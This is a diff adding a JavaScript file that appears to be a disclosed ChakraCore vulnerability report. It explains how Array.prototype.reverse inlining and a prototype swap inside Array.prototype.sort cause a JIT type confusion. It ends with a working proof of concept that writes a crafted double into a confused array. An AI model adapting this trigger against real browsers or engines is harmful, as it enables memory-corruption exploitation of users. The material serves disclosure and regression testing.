@@ -1,0 +1,48 @@
+/*
+This is simillar to the previous issue 1457. But this time, we use Array.prototype.reverse.
+
+Array.prototype.reverse can be inlined and may invoke EnsureNonNativeArray to convert the prototype of "this" to a Var array.
+Call flow: JavascriptArray::EntryReverse -> FillFromPrototypes -> ForEachOwnMissingArrayIndexOfObject -> EnsureNonNativeArray
+
+To make that happen, the prototype must be a native array. But this usually can't be fulfilled, since once it's set as a prototype, it gets converted to a Var array. To bypass this, we can use Array.prototype.sort.
+
+Here's a snippet of JavascriptArray::EntrySort.
+    arr = JavascriptNativeFloatArray::ConvertToVarArray((JavascriptNativeFloatArray*)arr);
+    JS_REENTRANT(jsReentLock, arr->Sort(compFn));
+    arr = arr->ConvertToNativeArrayInPlace<JavascriptNativeFloatArray, double>(arr);
+
+If "this" is a native array, the "sort" method first converts it to a Var array, sorts it, and then converts it back to the original type. So by setting it as a prototype in the compare function, we can make an object that its prototype is a native array.
+
+PoC:
+*/
+
+function opt(arr, arr2) {
+    arr2[0];
+
+    arr[0] = 1.1;
+    arr2.reverse();
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1, 2.2, 3.3];
+    arr.__proto__ = null;  // avoid inline caching 
+    delete arr[1];  // avoid doArrayMissingValueCheckHoist
+
+    let arr2 = [, {}];
+    arr2.__proto__ = {};
+    arr2.reverse = Array.prototype.reverse;
+
+    for (let i = 0; i < 10000; i++) {
+        opt(arr, arr2);
+    }
+
+    Array.prototype.sort.call(arr, () => {
+        arr2.__proto__.__proto__ = arr;
+    });
+
+    opt(arr, arr2);
+    print(arr[0]);
+}
+
+main();
